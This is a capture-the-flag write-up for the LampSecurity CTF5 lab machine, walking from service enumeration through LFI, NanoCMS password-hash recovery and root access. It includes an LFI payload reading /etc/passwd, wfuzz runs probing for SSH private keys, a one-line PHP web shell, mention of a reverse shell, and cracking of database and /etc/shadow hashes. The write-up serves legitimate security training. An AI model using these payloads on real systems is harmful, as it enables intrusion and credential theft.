LAMPSecurity: CTF5

[Machine](https://www.vulnhub.com/entry/lampsecurity-ctf5,84/ "https://www.vulnhub.com/entry/lampsecurity-ctf5,84/")

## Reconnaissance

### nmap

* ssh
* smtp
* 80 - httpd
* pop3
* rpcbind
* 139, 445 - netbios 
* imap
* 901 - http Samba Admin Server
* mysql
* 40050 - unknown

### Vulnerable versions

* [ ] ssh
* [ ] smtp
* [ ] 80 httpd
  ??? pop3
* [ ] rpcbind
* [ ] netbios
  ??? imap
  ??? 901
* [ ] mysql
  ??? 40050

### smtp

```bash
nc -vn 192.168.88.220 25
HELO x
MAIL FROM:test@test.com
RCPT TO:root
```
Cause nmap `smtp-enum-users` script didn't work.

### http 80

#### main page

Nothing.

#### Blog

* Nano CMS.
* Admin login.
* user: andy

#### /mail

* SquirrelMail version 1.4.11-1.fc8.
* Login form.

#### Contacts

* Form.

#### Events

* Login form.
* users: patrick, jennifer

#### dirb

* nothing interesting.

#### nikto

* phpMyAdmin 3.1.4

#### /events/robots.txt

A lot of URLs.

### pop3

With `pop3-capabilities` nmap script:
* pop3-capabilities: UIDL USER LOGIN-DELAY(180) STLS TOP

### smb

With `smbmap`:
* home
* IPC$
* Samba Server Version 3.0.26a-6.fc8.
* no access.
* nmap gave a [result](enum/smb/enum.nmap)

My attemts with `smbclient --no-pass //192.168.88.220/` or `smbclient -N -L //192.168.88.220/` were useless.

## Thread modeling

1. Search public exploits on new-found services.

2. Search for File Inclusion.

3. Attempt to inject SQL code.

4. brute-force ssh with hydra based on the found users.

## Vulnerabilities analysis

1. Didn't find useful cve...But I searched again and found it! NanoCMS has a [vulnerability](https://www.securityfocus.com/bid/34508/exploit "https://www.securityfocus.com/bid/34508/exploit").

2. Found LFI at `/index.php?page=../../../../../../etc/passwd%00`.

3. `/list` has a response with an error on `' test`.

4. Nothing.

## Exploitation

### LFI

I wanted to use wfuzz and brute-force all useful files:
```bash
wfuzz -c -w /usr/share/wordlists/lfi_linux.txt --hs "Warning" http://192.168.88.220/index.php?page=../../../../../../FUZZ%00 > wfuzz.txt
```

Brute-force `.ssh` and `id_rsa` key, but nothing:
```
wfuzz -c -w ../enum/creds/users.txt --hs "Warning" http://192.168.88.220/index.php?page=../../../../../../home/FUZZ/.ssh/id_rsa%00 > ssh_keys.txt 
```

I tried all cases and files...OKAY, I can't exploit it. Too heavy. You can find an exploit on this case with usage of `phpinfo.php`, but I'll try it later...

### Use /~andy/data/pagesdata.txt

Found hash of the password. Crack with [this](https://crackstation.net/ "https://crackstation.net/").
admin: shannon

Next step - try to get RCE.

#### RCE & reverse shell

Go to `New page` and create a file with content:
```php
<?php system($_GET['cmd']); ?>
```

Then, you'll try to get a reverse shell with bash or netcat, but nothing. So, all you have to do is search for php-reverse-shell, then paste the content within `New page` form and change host and port. Next, just go to the link.
Also, I watched a few directories through RCE, but I didn't find anything useful, Better get a shell and then see what you got. And you can use that shell with LFI. Create another shell, via RCE see the path to the shell. Next, type something like that `http://192.168.88.220/index.php?page=../../../../../../home/andy/public_html/data/pages/reverseshell` and you'll get a shell. But it's useless cause you can do it without LFI, but it is a proof of concept that you could exploit it in some way...

## Post exploitation 

### /var/www/html

After you got access to the target, you can see the `/var/www/html`. In which, you have to find `/list/`. I found it before, but don't do something with it. So, In file `index.php`, you'll see the password `mysqlpassword`. Log in to the phpmyadmin. Use a drupal table and select the users table, in which you'll see the hashes. Export them as csv file. Next, to extract hashes from csv:`cat users.csv | cut -f3 -d';' | tr -d '\"' > mysql_hashes`.

#### Crack the hash

[Crack with this.](https://crackstation.net/ "https://crackstation.net/")

Now, you know the password for patrick, amy, loren. Then, go to `/events/` and now you can log in to the Event Manager, but it gives you nothing.

### Privilege escalation

I just went through all the users home directories and user patrick has a dir `.tomboy`. I searched about it. So, it is a note-taking GUI application. Within the directory were files with strange names, I just did `cat *` and found the password for the root user: `50$cent`. Nice. Got root.

### GTFObins

```bash
for i in `find / -perm -4000 -type f 2>/dev/null`; do echo `ls -la $i`; done
```
To list all root suid files. But seems it is not vulnerable.

### Crack the /etc/shadow

```bash
john -w=/usr/share/wordlists/rockyou.txt shadow
```

### linpeas.sh

Ran the linpeas.sh script, but it gave nothing useful.

